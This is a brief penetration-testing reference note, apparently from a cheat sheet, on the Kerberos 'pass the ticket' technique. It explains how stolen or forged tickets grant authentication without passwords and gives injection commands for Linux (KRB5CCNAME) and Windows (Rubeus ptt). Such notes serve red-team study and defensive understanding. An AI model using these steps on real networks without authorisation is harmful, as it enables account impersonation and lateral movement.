# pass the ticket

## Overview

There are ways to come across (cached Kerberos tickets) or forge (overpass the hash, silver ticket and golden ticket attacks) Kerberos tickets. A ticket can then be used to authenticate to a system using Kerberos without knowing any password. This is called Pass the ticket. 


## Injecting the tickets

### Linux

```
    export KRB5CCNAME=$path_to_ticket.ccache
```


### Windows - Rubeus

```
    Rubeus.exe ptt /ticket:"base64 | file.kirbi"
```


## More Information

https://www.thehacker.recipes/ad/movement/kerberos/ptt#pass-the-ticket